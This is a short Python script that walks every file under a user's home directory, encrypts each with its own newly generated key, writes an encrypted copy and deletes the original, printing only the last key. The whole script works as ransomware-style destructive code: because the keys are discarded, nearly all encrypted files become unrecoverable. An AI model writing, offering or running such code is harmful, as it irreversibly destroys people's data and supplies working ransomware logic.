import os
from cryptography.fernet import Fernet

rootDir = '/Users/kakao'

# Initialize an empty list to store the file names
file_list = []

# Walk through all the directories and subdirectories
for dirName, subdirList, fileList in os.walk(rootDir):
    # Print the current directory
    print('Found directory: %s' % dirName)

    # Iterate over the files in the current directory
    for fname in fileList:
        # Append the full file path to the list
        file_list.append(os.path.join(dirName, fname))

# Print the list of files
for name in file_list:
    try:

# Generate a key
        key = Fernet.generate_key()

# Open the file to encrypt
#file_to_encrypt = open('file_to_encrypt.txt', 'rb')
        file_to_encrypt = open(name, 'rb')
# Read the contents of the file
        file_data = file_to_encrypt.read()

# Create a Fernet object using the key
        fernet = Fernet(key)

# Encrypt the file data
        encrypted_data = fernet.encrypt(file_data)
        new_name = name + '_enc.txt'
# Write the encrypted data to a new file
        encrypted_file = open(new_name, 'wb')
        encrypted_file.write(encrypted_data)

# Close the files
        file_to_encrypt.close()
        encrypted_file.close()
        os.remove(name)

    except:
        print("err")

# Print the key
print('Encryption key:', key)
